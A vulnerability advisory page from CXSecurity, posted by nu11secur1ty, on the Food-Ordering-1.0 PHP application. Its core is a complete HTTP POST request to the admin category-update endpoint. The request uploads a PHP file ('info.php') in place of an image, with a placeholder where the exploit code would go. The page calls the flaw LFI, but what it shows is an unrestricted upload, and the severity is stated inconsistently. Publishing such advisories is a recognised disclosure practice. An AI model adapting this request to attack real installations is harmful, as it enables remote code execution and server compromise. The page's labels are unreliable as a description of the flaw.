---
title: Food-Ordering-1.0 by Kato James Kalimba | LFI
url: https://cxsecurity.com/issue/WLB-2026090008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-09-26
fetch_date: 2026-09-27T07:24:27.157270
---

# Food-Ordering-1.0 by Kato James Kalimba | LFI

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Food-Ordering-1.0 by Kato James Kalimba | LFI** **2026.09.26**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Title: Food-Ordering-1.0 by Kato James Kalimba | LFI
# Author: nu11secur1ty
# Date: 9/23/2026
# Vendor: https://kato-james.42web.io/?i=2
# Software:
# Reference: https://portswigger.net/web-security/file-upload
## Description:
A Local File Inclusion (LFI) vulnerability involving parameter values like id=30 often happens when user input is passed directly to file-handling or database-backed file retrieval functions without proper sanitization. When an authenticated user can manipulate this parameter, it can lead to directory traversal, unauthorized access to sensitive files, or full server compromise.
STATUS: HIGH
[+]Payload:
```
POST /web/admin/update\_category.php?id=30&image\_name=Category\_1790143101.jpg HTTP/1.1
Host: localhost
Content-Length: 751
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="151", "Not=A?Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywUgBK3hPWQD0rRB1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/web/admin/update\_category.php?id=30&image\_name=Category\_1790143101.jpg
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=v8ietn62kr8ovses41m9ckpvg9
Connection: keep-alive
------WebKitFormBoundarywUgBK3hPWQD0rRB1
Content-Disposition: form-data; name="title"
ice cream
------WebKitFormBoundarywUgBK3hPWQD0rRB1
Content-Disposition: form-data; name="update\_image"; filename="info.php"
Content-Type: application/octet-stream
#### Your EXPLOIT here...
------WebKitFormBoundarywUgBK3hPWQD0rRB1
Content-Disposition: form-data; name="featured"
Yes
------WebKitFormBoundarywUgBK3hPWQD0rRB1
Content-Disposition: form-data; name="active"
Yes
------WebKitFormBoundarywUgBK3hPWQD0rRB1
Content-Disposition: form-data; name="submit"
update Category
------WebKitFormBoundarywUgBK3hPWQD0rRB1
Content-Disposition: form-data; name="current\_image"
Category\_1790143101.jpg
------WebKitFormBoundarywUgBK3hPWQD0rRB1--
```
# Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/2026/Food-Ordering-1.0-kato-james-kalemba)
# Demo:
[href](https://odysee.com/@nu11secur1ty:b/Food-Ordering-1.0-LFI)
# Time spent:
00:35:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026090008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top